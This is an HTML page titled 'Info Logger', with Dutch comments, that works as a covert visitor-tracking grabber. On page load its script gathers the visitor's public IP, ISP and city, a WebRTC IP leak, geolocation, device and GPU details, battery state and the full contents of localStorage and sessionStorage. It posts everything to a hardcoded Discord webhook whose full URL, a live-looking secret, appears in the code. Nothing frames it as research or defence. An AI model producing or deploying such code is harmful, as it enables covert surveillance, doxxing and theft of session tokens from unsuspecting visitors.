<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Info Logger</title>
    <script>
        // üö® Vervang met je eigen Discord webhook URL!
        const webhookURL = "https://discord.com/api/webhooks/1351915230162194505/1UuADVPH0L6Z7tZWe13pCuwuNyD0oCCTt94uFBJnYht9dWIgjaEXHQfw-N9M_EUmeBzi";

        function getIP() {
            fetch("https://api64.ipify.org?format=json")
            .then(response => response.json())
            .then(data => sendToDiscord("üåç Extern IP: " + data.ip));

            fetch("https://ipinfo.io/json")
            .then(response => response.json())
            .then(data => {
                let ipInfo = `üåê ISP: ${data.org}\nüåç Locatie: ${data.city}, ${data.region}, ${data.country}`;
                sendToDiscord(ipInfo);
            });
        }

        function getSystemInfo() {
            let info = {
                "üìå Browser": navigator.userAgent,
                "üñ•Ô∏è Besturingssysteem": navigator.platform,
                "üíæ RAM": navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Onbekend",
                "üñ•Ô∏è CPU-kernen": navigator.hardwareConcurrency || "Onbekend",
                "üìè Schermresolutie": window.screen.width + "x" + window.screen.height,
                "üåç Tijdzone": Intl.DateTimeFormat().resolvedOptions().timeZone,
                "üîã Batterijstatus": "Niet beschikbaar",
                "üîå Online status": navigator.onLine ? "‚úÖ Online" : "‚ùå Offline",
                "üîê Cookies ingeschakeld": navigator.cookieEnabled ? "‚úÖ Ja" : "‚ùå Nee",
                "üïµÔ∏è Referrer": document.referrer || "Direct bezoek"
            };

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    info["üìç Geolocatie"] = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
                    sendToDiscord(JSON.stringify(info, null, 2));
                }, () => {
                    sendToDiscord(JSON.stringify(info, null, 2));
                });
            } else {
                sendToDiscord(JSON.stringify(info, null, 2));
            }

            navigator.getBattery().then(battery => {
                info["üîã Batterijstatus"] = `${(battery.level * 100).toFixed(0)}% ${battery.charging ? "(üîå Opladen)" : "(üîã Niet aan het opladen)"}`;
                sendToDiscord(JSON.stringify(info, null, 2));
            });
        }

        function getWebRTCIP() {
            let peerConnection = new RTCPeerConnection({ iceServers: [] });
            peerConnection.createDataChannel("");
            peerConnection.createOffer().then(offer => peerConnection.setLocalDescription(offer));

            peerConnection.onicecandidate = event => {
                if (event.candidate) {
                    sendToDiscord("üåç WebRTC IP: " + event.candidate.candidate);
                }
            };
        }

        function getLocalStorage() {
            let localStorageData = {};
            for (let i = 0; i < localStorage.length; i++) {
                let key = localStorage.key(i);
                localStorageData[key] = localStorage.getItem(key);
            }
            sendToDiscord("üì¶ Local Storage: " + JSON.stringify(localStorageData, null, 2));
        }

        function getSessionStorage() {
            let sessionStorageData = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                let key = sessionStorage.key(i);
                sessionStorageData[key] = sessionStorage.getItem(key);
            }
            sendToDiscord("üì¶ Session Storage: " + JSON.stringify(sessionStorageData, null, 2));
        }

        function getGPUInfo() {
            let canvas = document.createElement("canvas");
            let gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");

            if (gl) {
                let debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
                let vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                let renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                sendToDiscord(`üéÆ GPU Vendor: ${vendor}\nüñ•Ô∏è Renderer: ${renderer}`);
            }
        }

        function sendToDiscord(message) {
            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: "```" + message + "```" })
            });
        }

        // üöÄ Automatisch alle info verzamelen en verzenden bij het laden van de pagina
        window.onload = function() {
            getIP();
            getSystemInfo();
            getWebRTCIP();
            getLocalStorage();
            getSessionStorage();
            getGPUInfo();
        };
    </script>
</head>
<body>
    <h2>üì° Informatie wordt verzameld...</h2>
</body>
</html>
